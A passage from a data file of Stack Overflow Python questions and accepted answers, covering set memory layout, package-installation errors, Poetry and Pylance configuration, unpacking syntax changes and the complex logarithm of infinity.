platforms is pretty surprising.\n\nUpdate: towards a fix\nI have opened an issue about this available here. One should not that putting the code in a function is significantly faster due to the variable being local (as pointed out by @Dennis in the comments).\n\nRelated posts:\n\nHow slow is Python's string concatenation vs. str.join?\nPython string 'join' is faster (?) than '+', but what's wrong here?\nPython string concatenation in for-loop in-place?\n\n"
}
{
    "Id": 74606984,
    "PostTypeId": 1,
    "Title": "How are small sets stored in memory?",
    "Body": "If we look at the resize behavior for sets under 50k elements:\n>>> import sys\n>>> s = set()\n>>> seen = {}\n>>> for i in range(50_000):\n...     size = sys.getsizeof(s)\n...     if size not in seen:\n...         seen[size] = len(s)\n...         print(f\"{size=} {len(s)=}\")\n...     s.add(i)\n... \nsize=216 len(s)=0\nsize=728 len(s)=5\nsize=2264 len(s)=19\nsize=8408 len(s)=77\nsize=32984 len(s)=307\nsize=131288 len(s)=1229\nsize=524504 len(s)=4915\nsize=2097368 len(s)=19661\n\nThis pattern is consistent with quadrupling of the backing storage size once the set is 3/5ths full, plus some presumably constant overhead for the PySetObject:\n>>> for i in range(9, 22, 2):\n...     print(2**i + 216)\n... \n728\n2264\n8408\n32984\n131288\n524504\n2097368\n\nA similar pattern continues even for larger sets, but the resize factor switches to doubling instead of quadrupling.\nThe reported size for small sets is an outlier. Instead of size 344 bytes, i.e. 16 * 8 + 216 (the storage array of a newly created empty set has 8 slots avail until the first resize up to 32 slots) only 216 bytes is reported by sys.getsizeof.\nWhat am I missing? How are those small sets stored so that they use only 216 bytes instead of 344?\n",
    "AcceptedAnswerId": 74612168,
    "AcceptedAnswer": "The set object in Python is represented by the following C structure.\ntypedef struct {\n    PyObject_HEAD\n\n    Py_ssize_t fill;            /* Number of active and dummy entries*/\n    Py_ssize_t used;            /* Number of active entries */\n\n    /* The table contains mask + 1 slots, and that's a power of 2.\n     * We store the mask instead of the size because the mask is more\n     * frequently needed.\n     */\n    Py_ssize_t mask;\n\n    /* The table points to a fixed-size smalltable for small tables\n     * or to additional malloc'ed memory for bigger tables.\n     * The table pointer is never NULL which saves us from repeated\n     * runtime null-tests.\n     */\n    setentry *table;\n    Py_hash_t hash;             /* Only used by frozenset objects */\n    Py_ssize_t finger;          /* Search finger for pop() */\n\n    setentry smalltable[PySet_MINSIZE];\n    PyObject *weakreflist;      /* List of weak references */\n} PySetObject;\n\nNow remember, getsizeof() calls the object\u2019s __sizeof__ method and adds an additional garbage collector overhead if the object is managed by the garbage collector.\nOk, set implements the __sizeof__.\nstatic PyObject *\nset_sizeof(PySetObject *so, PyObject *Py_UNUSED(ignored))\n{\n    Py_ssize_t res;\n\n    res = _PyObject_SIZE(Py_TYPE(so));\n    if (so->table != so->smalltable)\n        res = res + (so->mask + 1) * sizeof(setentry);\n    return PyLong_FromSsize_t(res);\n}\n\nNow let\u2019s inspect the line\nres = _PyObject_SIZE(Py_TYPE(so));\n\n_PyObject_SIZE is just a macro which expands to (typeobj)->tp_basicsize.\n#define _PyObject_SIZE(typeobj) ( (typeobj)->tp_basicsize )\n\nThis code is essentially trying to access the tp_basicsize slot to get the size in bytes of instances of the type which is just sizeof(PySetObject) in case of set.\nPyTypeObject PySet_Type = {\n    PyVarObject_HEAD_INIT(&PyType_Type, 0)\n    \"set\",                              /* tp_name */\n    sizeof(PySetObject),                /* tp_basicsize */\n    0,                                  /* tp_itemsize */\n    # Skipped rest of the code for brevity.\n\nI have modified the set_sizeof C function with the following changes.\nstatic PyObject *\nset_sizeof(PySetObject *so, PyObject *Py_UNUSED(ignored))\n{\n    Py_ssize_t res;\n\n    unsigned long py_object_head_size = sizeof(so->ob_base); // Because PyObject_HEAD expands to PyObject ob_base;\n    unsigned long fill_size = sizeof(so->fill);\n    unsigned long used_size = sizeof(so->used);\n    unsigned long mask_size = sizeof(so->mask);\n    unsigned long table_size = sizeof(so->table);\n    unsigned long hash_size = sizeof(so->hash);\n    unsigned long finger_size = sizeof(so->finger);\n    unsigned long smalltable_size = sizeof(so->smalltable);\n    unsigned long weakreflist_size = sizeof(so->weakreflist);\n    int is_using_fixed_size_smalltables = so->table == so->smalltable;\n\n    printf(\"| PySetObject Fields   | Size(bytes) |\\n\");\n    printf(\"|------------------------------------|\\n\");\n    printf(\"|    PyObject_HEAD     |     '%zu'    |\\n\", py_object_head_size);\n    printf(\"|      fill            |      '%zu'    |\\n\", fill_size);\n    printf(\"|      used            |      '%zu'    |\\n\", used_size);\n    printf(\"|      mask            |      '%zu'    |\\n\", mask_size);\n    printf(\"|      table           |      '%zu'    |\\n\", table_size);\n    printf(\"|      hash            |      '%zu'    |\\n\", hash_size);\n    printf(\"|      finger          |      '%zu'    |\\n\", finger_size);\n    printf(\"|    smalltable        |    '%zu'    |\\n\", smalltable_size);\n    printf(\"|    weakreflist       |      '%zu'    |\\n\", weakreflist_size);\n    printf(\"-------------------------------------|\\n\");\n    printf(\"|       Total          |    '%zu'    |\\n\", py_object_head_size+fill_size+used_size+mask_size+table_size+hash_size+finger_size+smalltable_size+weakreflist_size);\n    printf(\"\\n\");\n    printf(\"Total size of PySetObject '%zu' bytes\\n\", sizeof(PySetObject));\n    printf(\"Has set resized: '%s'\\n\", is_using_fixed_size_smalltables ? \"No\": \"Yes\");\n    if(!is_using_fixed_size_smalltables) {\n        printf(\"Size of malloc'ed table: '%zu' bytes\\n\", (so->mask + 1) * sizeof(setentry));\n    }\n\n    res = _PyObject_SIZE(Py_TYPE(so));\n    if (so->table != so->smalltable)\n        res = res + (so->mask + 1) * sizeof(setentry);\n    return PyLong_FromSsize_t(res);\n}\n\nand compiling and running these changes gives me\n>>> import sys\n>>>\n>>> set_ = set()\n>>> sys.getsizeof(set_)\n| PySetObject Fields   | Size(bytes) |\n|------------------------------------|\n|    PyObject_HEAD     |     '16'    |\n|      fill            |      '8'    |\n|      used            |      '8'    |\n|      mask            |      '8'    |\n|      table           |      '8'    |\n|      hash            |      '8'    |\n|      finger          |      '8'    |\n|    smalltable        |    '128'    |\n|    weakreflist       |      '8'    |\n-------------------------------------|\n|       Total          |    '200'    |\n\nTotal size of PySetObject '200' bytes\nHas set resized: 'No'\n216\n>>> set_.add(1)\n>>> set_.add(2)\n>>> set_.add(3)\n>>> set_.add(4)\n>>> set_.add(5)\n>>> sys.getsizeof(set_)\n| PySetObject Fields   | Size(bytes) |\n|------------------------------------|\n|    PyObject_HEAD     |     '16'    |\n|      fill            |      '8'    |\n|      used            |      '8'    |\n|      mask            |      '8'    |\n|      table           |      '8'    |\n|      hash            |      '8'    |\n|      finger          |      '8'    |\n|    smalltable        |    '128'    |\n|    weakreflist       |      '8'    |\n-------------------------------------|\n|       Total          |    '200'    |\n\nTotal size of PySetObject '200' bytes\nHas set resized: 'Yes'\nSize of malloc'ed table: '512' bytes\n728\n\nThe return value is 216/728 bytes because sys.getsize add 16 bytes of GC overhead.\nBut the important thing to note here is this line.\n|    smalltable        |    '128'    |\n\nBecause for small tables(before the first resize) so->table is just a reference to fixed size(8) so->smalltable(No malloc'ed memory) so sizeof(PySetObject) is sufficient enough to get the size because it also includes the storage size( 128(16(size of setentry) * 8)).\nNow what happens when the resize occurs? It constructs entirely new table (malloc'ed) and uses that table instead of so->smalltables. This means that the sets, which have resized, also carry out a dead-weight of 128 bytes (size of fixed size small table) along with the size of malloc'ed so->table.\nelse {\n        newtable = PyMem_NEW(setentry, newsize);\n        if (newtable == NULL) {\n            PyErr_NoMemory();\n            return -1;\n        }\n    }\n\n    /* Make the set empty, using the new table. */\n    assert(newtable != oldtable);\n    memset(newtable, 0, sizeof(setentry) * newsize);\n    so->mask = newsize - 1;\n    so->table = newtable;\n\n"
}
{
    "Id": 74314778,
    "PostTypeId": 1,
    "Title": "NameError: name 'glPushMatrix' is not defined",
    "Body": "Try to run a test code for stable baselines gym\nimport gym\n\nfrom stable_baselines3 import A2C\n\nenv = gym.make(\"CartPole-v1\")\n\nmodel = A2C(\"MlpPolicy\", env, verbose=1)\nmodel.learn(total_timesteps=10_000)\n\nobs = env.reset()\nfor i in range(100):\n    action, _state = model.predict(obs, deterministic=True)\n    obs, reward, done, info = env.step(action)\n    env.render()\n    if done:\n      obs = env.reset()\n\nfound the error \"NameError: name 'glPushMatrix' is not defined\"\nTraceback (most recent call last):\n  File \"test_cart_pole.py\", line 14, in \n    env.render()\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/core.py\", line 295, in render\n    return self.env.render(mode, **kwargs)\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/cartpole.py\", line 229, in render\n    return self.viewer.render(return_rgb_array=mode == \"rgb_array\")\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/rendering.py\", line 126, in render\n    self.transform.enable()\n  File \"/Users/xxx/opt/anaconda3/lib/python3.8/site-packages/gym/envs/classic_control/rendering.py\", line 232, in enable\n    glPushMatrix()\nNameError: name 'glPushMatrix' is not defined\n\nI  tried  \"pip install PyOpenGL PyOpenGL_accelerate\", which didn't help\nalso uninstall pyglet and install again , did't work too\nAny Idea???\n",
    "AcceptedAnswerId": 74324578,
    "AcceptedAnswer": "Just had the same problem. Fixed it by installing an older version of pyglet:\n$ pip install pyglet==1.5.27\n\nI don't know if this is the latest version that avoids the problem, but it works.\n"
}
{
    "Id": 73144451,
    "PostTypeId": 1,
    "Title": "ModuleNotFoundError: No module named 'setuptools.command.build'",
    "Body": "I am trying to pip install sentence transformers. I am working on a Macbook pro with an M1 chip. I am using the following command:\n\npip3 install -U sentence-transformers\n\nWhen I run this, I get this error/output and I do not know how to fix it...\nDefaulting to user installation because normal site-packages is not writeable\nCollecting sentence-transformers\n  Using cached sentence-transformers-2.2.2.tar.gz (85 kB)\n  Preparing metadata (setup.py) ... done\nCollecting transformers=4.6.0\n  Using cached transformers-4.21.0-py3-none-any.whl (4.7 MB)\nCollecting tqdm\n  Using cached tqdm-4.64.0-py2.py3-none-any.whl (78 kB)\nRequirement already satisfied: torch>=1.6.0 in ./Library/Python/3.8/lib/python/site-packages (from sentence-transformers) (1.12.0)\nCollecting torchvision\n  Using cached torchvision-0.13.0-cp38-cp38-macosx_11_0_arm64.whl (1.2 MB)\nRequirement already satisfied: numpy in ./Library/Python/3.8/lib/python/site-packages (from sentence-transformers) (1.23.1)\nCollecting scikit-learn\n  Using cached scikit_learn-1.1.1-cp38-cp38-macosx_12_0_arm64.whl (7.6 MB)\nCollecting scipy\n  Using cached scipy-1.8.1-cp38-cp38-macosx_12_0_arm64.whl (28.6 MB)\nCollecting nltk\n  Using cached nltk-3.7-py3-none-any.whl (1.5 MB)\nCollecting sentencepiece\n  Using cached sentencepiece-0.1.96.tar.gz (508 kB)\n  Preparing metadata (setup.py) ... done\nCollecting huggingface-hub>=0.4.0\n  Using cached huggingface_hub-0.8.1-py3-none-any.whl (101 kB)\nCollecting requests\n  Using cached requests-2.28.1-py3-none-any.whl (62 kB)\nCollecting pyyaml>=5.1\n  Using cached PyYAML-6.0.tar.gz (124 kB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... done\n  Preparing metadata (pyproject.toml) ... done\nRequirement already satisfied: typing-extensions>=3.7.4.3 in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub>=0.4.0->sentence-transformers) (4.3.0)\nRequirement already satisfied: filelock in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub>=0.4.0->sentence-transformers) (3.7.1)\nRequirement already satisfied: packaging>=20.9 in ./Library/Python/3.8/lib/python/site-packages (from huggingface-hub>=0.4.0->sentence-transformers) (21.3)\nCollecting tokenizers!=0.11.3,=0.11.1\n  Using cached tokenizers-0.12.1.tar.gz (220 kB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... error\n  error: subprocess-exited-with-error\n  \n  \u00d7 Getting requirements to build wheel did not run successfully.\n  \u2502 exit code: 1\n  \u2570\u2500> [20 lines of output]\n      Traceback (most recent call last):\n        File \"/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py\", line 363, in \n          main()\n        File \"/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py\", line 345, in main\n          json_out['return_val'] = hook(**hook_input['kwargs'])\n        File \"/Users/joeyoneill/Library/Python/3.8/lib/python/site-packages/pip/_vendor/pep517/in_process/_in_process.py\", line 130, in get_requires_for_build_wheel\n          return hook(config_settings)\n        File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py\", line 146, in get_requires_for_build_wheel\n          return self._get_build_requires(\n        File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py\", line 127, in _get_build_requires\n          self.run_setup()\n        File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages/setuptools/build_meta.py\", line 142, in run_setup\n          exec(compile(code, __file__, 'exec'), locals())\n        File \"setup.py\", line 2, in \n          from setuptools_rust import Binding, RustExtension\n        File \"/private/var/folders/bg/ncfh283n4t39vqhvbd5n9ckh0000gn/T/pip-build-env-vjj6eow8/overlay/lib/python3.8/site-packages/setuptools_rust/__init__.py\", line 1, in \n          from .build import build_rust\n        File \"/private/var/folders/bg/ncfh283n4t39vqhvbd5n9ckh0000gn/T/pip-build-env-vjj6eow8/overlay/lib/python3.8/site-packages/setuptools_rust/build.py\", line 20, in \n          from setuptools.command.build import build as CommandBuild  # type: ignore[import]\n      ModuleNotFoundError: No module named 'setuptools.command.build'\n      [end of output]\n  \n  note: This error originates from a subprocess, and is likely not a problem with pip.\nerror: subprocess-exited-with-error\n\n\u00d7 Getting requirements to build wheel did not run successfully.\n\u2502 exit code: 1\n\u2570\u2500> See above for output.\n\nnote: This error originates from a subprocess, and is likely not a problem with pip.\n\nCan anybody tell me what I should do or what is wrong with what I am currently doing? I factory reset my Mac and re-downloaded everything but I still get this same error. I am stumped.\n",
    "AcceptedAnswerId": 73868734,
    "AcceptedAnswer": "I posted this as an issue to the actual Sentence Transformers GitHub page. Around 4 days ago I was given this answer by a \"Federico Viticci\" which resolved the issue and allowed me to finally install the library:\n\"For what it is worth, I was having the exact issue. Installing it directly from source using\npip install git+https://github.com/huggingface/transformers\n\nfixed it on my M1 Max MacBook Pro.\"\nOriginal Git Issue here:\nhttps://github.com/UKPLab/sentence-transformers/issues/1652\n"
}
{
    "Id": 74398563,
    "PostTypeId": 1,
    "Title": "How to use polars dataframes with scikit-learn?",
    "Body": "I'm unable to use polars dataframes with scikitlearn for ML training.\nCurrently I'm doing all the dataframe preprocessing in polars and during model training i'm converting it into a pandas one in order for it to work.\nIs there any method to directly use polars dataframe as it is for ML training without changing it to pandas?\n",
    "AcceptedAnswerId": 74402124,
    "AcceptedAnswer": "You must call to_numpy when passing a DataFrame to sklearn. Though sometimes sklearn can work on polars Series it is still good type hygiene to transform to the type the host library expects.\nimport polars as pl\nfrom sklearn.linear_model import LinearRegression\n\ndata = pl.DataFrame(\n    np.random.randn(100, 5)\n)\n\nx = data.select([\n    pl.all().exclude(\"column_0\"),\n])\n\ny = data.select(pl.col(\"column_0\").alias(\"y\"))\n\n\nx_train = x[:80]\ny_train = y[:80]\n\nx_test = x[80:]\ny_test = y[80:]\n\n\nm = LinearRegression()\n\nm.fit(X=x_train.to_numpy(), y=y_train.to_numpy())\nm.predict(x_test.to_numpy())\n\n"
}
{
    "Id": 73876790,
    "PostTypeId": 1,
    "Title": "Poetry configuration is invalid - Additional properties are not allowed ('group' was unexpected)",
    "Body": "Recently, I faced this issue with Poetry. All my commands using poetry were failing with the following error.\nRuntimeError\n\n  The Poetry configuration is invalid:\n    - Additional properties are not allowed ('group' was unexpected)\n\n",
    "AcceptedAnswerId": 73876791,
    "AcceptedAnswer": "I figured out the following issue.\n\nThe code owners had updated the poetry core requirement to requires = [\"poetry-core>=1.2.0\"]\nMy current poetry version was 1.1.12\n\nI did the following to fix my issue.\n# remove the current poetry installation\nrm -rf /Users/myusername/.poetry\n\n# upgrade poetry version\npip install poetry -U\n\nThis should solve the problem. I verified the same by running my other poetry commands.\n\nIt should be noted that your current poetry configurations will be lost while doing this, and would need to be recreated and reinstalled.\n\n# reinstall poetry for my project\npoetry install\n\n"
}
{
    "Id": 74454587,
    "PostTypeId": 1,
    "Title": "sentry sdk custom performance integration for python app",
    "Body": "Sentry can track performance for celery tasks and API endpoints\nhttps://docs.sentry.io/product/performance/\nI have custom script that are lunching by crone and do set of similar tasks\nI want to incorporated sentry_sdk into my script to get performance tracing of my tasks\nAny advise how to do it with\nhttps://getsentry.github.io/sentry-python/api.html#sentry_sdk.capture_event\n",
    "AcceptedAnswerId": 74481555,
    "AcceptedAnswer": "You don't need use capture_event\nI would suggest to use sentry_sdk.start_transaction instead. It also allows track your function performance.\nLook at my example\nfrom time import sleep\nfrom sentry_sdk import Hub, init, start_transaction\n\ninit(\n    dsn=\"dsn\",\n    traces_sample_rate=1.0,\n)\n\n\ndef sentry_trace(func):\n    def wrapper(*args, **kwargs):\n        transaction = Hub.current.scope.transaction\n        if transaction:\n            with transaction.start_child(op=func.__name__):\n                return func(*args, **kwargs)\n        else:\n            with start_transaction(op=func.__name__, name=func.__name__):\n                return func(*args, **kwargs)\n\n    return wrapper\n\n\n@sentry_trace\ndef b():\n    for i in range(1000):\n        print(i)\n\n\n@sentry_trace\ndef c():\n    sleep(2)\n    print(1)\n\n\n@sentry_trace\ndef a():\n    sleep(1)\n    b()\n    c()\n\n\nif __name__ == '__main__':\n    a()\n\nAfter starting this code you can see basic info of transaction a with childs b and c\n\n"
}
{
    "Id": 74556349,
    "PostTypeId": 1,
    "Title": "No module named 'huggingface_hub.snapshot_download'",
    "Body": "When I try to run the quick start notebook of this repo, I get the error ModuleNotFoundError: No module named 'huggingface_hub.snapshot_download'. How can I fix it? I already installed huggingface_hub using pip.\nI get the error after compiling the following cell:\n!CUDA_VISIBLE_DEVICES=0 python -u ../scripts/main.py --summarizer gpt3_summarizer --controller longformer_classifier longformer_classifier --loader alignment coherence --controller-load-dir emnlp22_re3_data/ckpt/relevance_reranker emnlp22_re3_data/ckpt/coherence_reranker --controller-model-string allenai/longformer-base-4096 allenai/longformer-base-4096 --save-outline-file output/outline0.pkl --save-complete-file output/complete_story0.pkl --log-file output/story0.log\n\nHere's the entire output:\nTraceback (most recent call last):\n  File \"../scripts/main.py\", line 20, in \n    from story_generation.edit_module.entity import *\n  File \"/home/jovyan/emnlp22-re3-story-generation/story_generation/edit_module/entity.py\", line 20, in \n    from story_generation.common.util import *\n  File \"/home/jovyan/emnlp22-re3-story-generation/story_generation/common/util.py\", line 13, in \n    from sentence_transformers import SentenceTransformer\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/__init__.py\", line 3, in \n    from .datasets import SentencesDataset, ParallelSentencesDataset\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/datasets/__init__.py\", line 3, in \n    from .ParallelSentencesDataset import ParallelSentencesDataset\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/datasets/ParallelSentencesDataset.py\", line 4, in \n    from .. import SentenceTransformer\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/SentenceTransformer.py\", line 25, in \n    from .evaluation import SentenceEvaluator\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/evaluation/__init__.py\", line 5, in \n    from .InformationRetrievalEvaluator import InformationRetrievalEvaluator\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/evaluation/InformationRetrievalEvaluator.py\", line 6, in \n    from ..util import cos_sim, dot_score\n  File \"/opt/conda/lib/python3.8/site-packages/sentence_transformers/util.py\", line 407, in \n    from huggingface_hub.snapshot_download import REPO_ID_SEPARATOR\nModuleNotFoundError: No module named 'huggingface_hub.snapshot_download'\n\n",
    "AcceptedAnswerId": 74573811,
    "AcceptedAnswer": "Updating to the latest version of sentence-transformers fixes it (no need to install huggingface-hub explicitly):\npip install -U sentence-transformers\n\nI've proposed a pull request for this in the original repo.\n"
}
{
    "Id": 74660176,
    "PostTypeId": 1,
    "Title": "Using VisualStudio+ Python -- how to handle \"overriding stdlib module\" Pylance(reportShadowedImports) warning?",
    "Body": "When running ipynbs in VS Code, I've started noticing Pylance warnings on standard library imports. I am using a conda virtual environment, and I believe the warning is related to that. An example using the glob library reads:\n \"env\\Lib\\glob.py\" is overriding the stdlib \"glob\" modulePylance(reportShadowedImports)\nSo far my notebooks run as expected, but I am curious if this warning is indicative of poor layout or is just stating the obvious more of an \"FYI you are not using the base install of python\".\nI have turned off linting and the problem stills persists. And almost nothing returns from my searches of the error \"reportShadowedImports\".\n",
    "AcceptedAnswerId": 74675579,
    "AcceptedAnswer": "The reason you find nothing by searching is because this check has just been implemented recently (see Github). I ran into the same problem as you because code.py from Micropython/Circuitpython also overrides the module \"code\" in stdlib.\nThe solution is simple, though you then loose out on this specific check. Just add reportShadowedImports to your pyright config. For VS Code, that would be adding it to .vscode/settings.json:\n{\n  \"python.languageServer\": \"Pylance\",\n  [...]\n  \"python.analysis.diagnosticSeverityOverrides\": {\n      \"reportShadowedImports\": \"none\"\n  },\n  [...]\n}\n\n"
}
{
    "Id": 73888639,
    "PostTypeId": 1,
    "Title": "Why is this unpacking expression not allowed in python3.10?",
    "Body": "I used to unpack a long iterable expression like this:\nIn python 3.8.7:\n>>> _, a, (*_), c = [1,2,3,4,5,6]\n>>> a\n2\n>>> c\n6\n\nIn python 3.10.7:\n>>> _, a, (*_), c = [1,2,3,4,5,6]\n  File \"\", line 1\n    _, a, (*_), c = [1,2,3,4,5,6]\n           ^^\nSyntaxError: cannot use starred expression here\n\nI'm not sure which version of python between 3.8.7 and 3.10.7 introduced this backwards breaking behavior. What's the justification for this?\n",
    "AcceptedAnswerId": 73888752,
    "AcceptedAnswer": "There's an official discussion here. The most relevant quote I can find is:\n\n\nAlso the current behavior allows (*x), y = 1 assignment. If (*x) is to be totally disallowed, (*x), y = 1 should also be rejected.\n\n\n\nI agree.\n\nThe final \"I agree\" is from Guido van Rossum.\nThe rationale for rejecting (*x) was:\n\nHonestly this seems like a bug in 3.8 to me (if it indeed behaves like\nthis):\n>>> (*x), y (1, 2, 3)\n\nEvery time I mistakenly tried (*x) I really meant (*x,), so it's\nsurprising that (*x), y would be interpreted as (*x, y) rather than\nflagging (*x) as an error.\nPlease don't \"fix\" this even if it is a regression.\n\nAlso by Guido van Rossum. So it seems like (*x) was rejected because it looks too similar to unpacking into a singlet tuple.\n"
}
{
    "Id": 74583630,
    "PostTypeId": 1,
    "Title": "Why is Python saying modules are imported when they are not?",
    "Body": "Python 3.6.5\nUsing this answer as a guide, I attempted to see whether some modules, such as math were imported.\nBut Python tells me they are all imported when they are not.\n>>> import sys\n>>> 'math' in sys.modules\nTrue\n>>> 'math' not in sys.modules\nFalse\n>>> math.pi\nTraceback (most recent call last):\n  File \"\", line 1, in \nNameError: name 'math' is not defined\n>>> import math\n>>> 'math' in sys.modules\nTrue\n>>> math.pi\n3.141592653589793\n\n",
    "AcceptedAnswerId": 74583684,
    "AcceptedAnswer": "to explain this, let's define this function:\ndef import_math():\n    import math\n\nimport_math()\n\nthe above function will import the module math, but only in its local scope, anyone that tries to reference math outside of it will get a name error, because math is not defined in the global scope.\nany module that is imported is saved into sys.modules so a call to check\nimport_math()\nprint(\"math\" in sys.modules)\n\nwill print True, because sys.modules caches any module that is loaded anywhere, whether or not it was available in the global scope, a very simple way to define math in the global scope would then to\nimport_math()\nmath = sys.modules[\"math\"]\n\nwhich will convert it from being only in sys.modules to being in the global scope, this is just equivalent to\nimport math\n\nwhich defines a variable math in the global scope that points to the module math.\nnow if you want to see whether \"math\" exists in the global scope is to check if it is in the global scope directly.\nprint(\"math\" in globals())\nprint(\"math\" in locals())\n\nwhich will print false if \"math\" wasn't imported into the global or local scope and is therefore inaccessable.\n"
}
{
    "Id": 74508024,
    "PostTypeId": 1,
    "Title": "Is requirements.txt still needed when using pyproject.toml?",
    "Body": "Since mid 2022 it is now possible to get rid of setup.py, setup.cfg in favor of pyproject.toml. Editable installs work with recent versions of setuptools and pip and even the official packaging tutorial switched away from setup.py to pyproject.toml.\nHowever, documentation regarding requirements.txt seems to be have been also removed, and I wonder where to put the pinned requirements now?\nAs a refresher: It used to be common practice to put the dependencies (without version pinning) in setup.py avoiding issues when this package gets installed with other packages needing the same dependencies but with conflicting version requirements. For packaging libraries a setup.py was usually sufficient.\nFor deployments (i.e. non libraries) you usually also provided a requirements.txt with version-pinned dependencies. So you don't accidentally get the latest and greatest but the exact versions of dependencies that that package has been tested with.\nSo my question is, did anything change? Do you still put the pinned requirements in the requirements.txt when used together with pyproject.toml? Or is there an extra section\nfor that in pyproject.toml? Is there some documentation on that somewhere?\n",
    "AcceptedAnswerId": 74625055,
    "AcceptedAnswer": "Quoting myself from here\n\nMy current assumption is: [...] you put your (mostly unpinned) dependencies to pyproject.toml instead of setup.py, so you library can be installed as a dependency of something else without causing much troubles because of issues resolving version constraints.\n\n\nOn top of that, for \"deployable applications\" (for lack of a better term), you still want to maintain a separate requirements.txt with exact version pinning.\n\nWhich has been confirmed by a Python Packaging Authority (PyPA) member and clarification of PyPA's recommendations should be updated accordingly at some point.\n"
}
{
    "Id": 71319523,
    "PostTypeId": 1,
    "Title": "Django rest framework drf-yasg swagger multiple file upload error for ListField serializer",
    "Body": "I am trying to make upload file input from swagger (with drf-yasg), but when I use MultiPartParser class it gives me the below error:\ndrf_yasg.errors.SwaggerGenerationError: FileField is supported only in a formData Parameter or response Schema\n\nMy view:\nclass AddExperience(generics.CreateAPIView):\n    parser_classes = [MultiPartParser]\n\n    permission_classes = [IsAuthenticated]\n    serializer_class = DoctorExperienceSerializer\n\nMy serializer:\nclass DoctorExperienceSerializer(serializers.Serializer):\n    diploma = serializers.ListField(\n        child=serializers.FileField(allow_empty_file=False)\n    )\n    education = serializers.CharField(max_length=1000)\n    work_experience = serializers.CharField(max_length=1000)\n\nI also tried FormParser but it still gives me the same error. Also: FileUploadParser parser but it works like JsonParser:\n",
    "AcceptedAnswerId": 74684163,
    "AcceptedAnswer": "The OpenAPISchema (OAS) 2 doesn't support the multiple file upload (see issue #254); but OAS 3 supports it (you can use this YML spec on a live swagger editer (see this result)).\nComes to the real issue, there is a section in the drf-yasg's doc,\n\nIf you are looking to add Swagger/OpenAPI support to a new project you might want to take a look at drf-spectacular, which is an actively maintained new library that shares most of the goals of this project, while working with OpenAPI 3.0 schemas.\nOpenAPI 3.0 provides a lot more flexibility than 2.0 in the types of API that can be described. drf-yasg is unlikely to soon, if ever, get support for OpenAPI 3.0.\n\nThat means the package drf-yasg doesn't have support for OAS3 and thus, it won't support the \"multiple file upload\" feature.\nYou can consider migrating from drf-yasg to drf-spectacular. But, also note that, drf-spectacular is also dealing the FileUpload in a different way.\n"
}
{
    "Id": 74067547,
    "PostTypeId": 1,
    "Title": "Could not find poetry-1.2.2-linux.sha256sum file",
    "Body": "I am trying to update my version of Poetry to 1.2.*, but when running poetry self update I get the error Could not find poetry-1.2.2-linux.sha256sum file... I can't figure out how to try and update Poetry to an earlier version for which hopefully the checksum exists.\n",
    "AcceptedAnswerId": 74067692,
    "AcceptedAnswer": "You are trying to update a Poetry that was installed with the get-poetry.py installer. This installer is deprecated for more than a year now. Updating via poetry self update is not possible for these installation. Uninstall Poetry and reinstall with the recommended installer.\nMore information are available at https://python-poetry.org/blog/announcing-poetry-1.2.0/\n"
}
{
    "Id": 74798626,
    "PostTypeId": 1,
    "Title": "Why is log(inf + inf j) equal to (inf + 0.785398 j), In C++/Python/NumPy?",
    "Body": "I've been finding a strange behaviour of log functions in C++ and numpy about the behaviour of log function handling complex infinite numbers. Specifically, log(inf + inf * 1j) equals (inf + 0.785398j) when I expect it to be (inf + nan * 1j).\nWhen taking the log of a complex number, the real part is the log of the absolute value of the input and the imaginary part is the phase of the input. Returning 0.785398 as the imaginary part of log(inf + inf * 1j) means it assumes the infs in the real and the imaginary part have the same length.\nThis assumption does not seem to be consistent with other calculation, for example, inf - inf == nan, inf / inf == nan which assumes 2 infs do not necessarily have the same values.\nWhy is the assumption for log(inf + inf * 1j) different?\nReproducing C++ code:\n#include \n#include \n#include \nint main() {\n    double inf = std::numeric_limits::infinity();\n    std::complex b(inf, inf);\n    std::complex c = std::log(b);\n    std::cout << c << \"\\n\";\n}\n\nReproducing Python code (numpy):\nimport numpy as np\n\na = complex(float('inf'), float('inf'))\nprint(np.log(a))\n\nEDIT: Thank you for everyone who's involved in the discussion about the historical reason and the mathematical reason. All of you turn this naive question into a really interesting discussion. The provided answers are all of high quality and I wish I can accept more than 1 answers. However, I've decided to accept @simon's answer as it explains in more detail the mathematical reason and provided a link to the document explaining the logic (although I can't fully understand it).\n",
    "AcceptedAnswerId": 74799453,
    "AcceptedAnswer": "The value of 0.785398 (actually pi/4) is consistent with at least some other functions: as you said, the imaginary part of the logarithm of a complex number is identical with the phase angle of the number. This can be reformulated to a question of its own: what is the phase angle of inf + j * inf?\nWe can calculate the phase angle of a complex number z by atan2(Im(z), Re(z)). With the given number, this boils down to calculating atan2(inf, inf), which is also 0.785398 (or pi/4), both for Numpy and C/C++. So now a similar question could be asked: why is atan2(inf, inf) == 0.785398?\nI do not have an answer to the latter (except for \"the C/C++ specifications say so\", as others already answered), I only have a guess: as atan2(y, x) == atan(y / x) for x > 0, probably someone made the decision in this context to not interpret inf / inf as \"undefined\" but instead as \"a very large number divided by the same very large number\". The result of this ratio would be 1, and atan(1) == pi/4 by the mathematical definition of atan.\nProbably this is not a satisfying answer, but at least I could hopefully show that the log definition in the given edge case is not completely inconsistent with similar edge cases of related function definitions.\nEdit: As I said, 